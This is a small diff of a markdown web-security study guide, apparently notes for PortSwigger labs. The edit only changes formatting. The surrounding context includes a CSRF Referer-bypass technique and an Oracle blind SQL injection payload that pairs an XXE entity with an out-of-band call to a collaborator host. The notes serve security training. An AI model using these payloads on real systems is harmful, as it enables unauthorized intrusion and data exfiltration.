@@ -1143,7 +1143,6 @@ Referrer-Policy: unsafe-url
 
 [PortSwigger Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)  
   
-  
 ### Referer Header Present  
 
 >In the update email request when changing the ```referer``` header the response indicate invalid referer header, identifying CSRF vulnerability. Using the ```<meta name="referrer" content="no-referrer">``` as part of the exploit server CSRF PoC this control can be bypassed.  
@@ -1306,7 +1305,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 ### Blind SQLi no indication  
 
->Placing a single quote at end of the trackingid cookie or search parameter give no internal server error 500. Making educated guess, by using below blind SQLi payload abd combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.  
+>Placing a single quote at end of the ```trackingid``` cookie or search parameter give no internal server error 500. Making educated guess, by using below blind SQLi payload abd combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.  
 
 ```sql
 TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
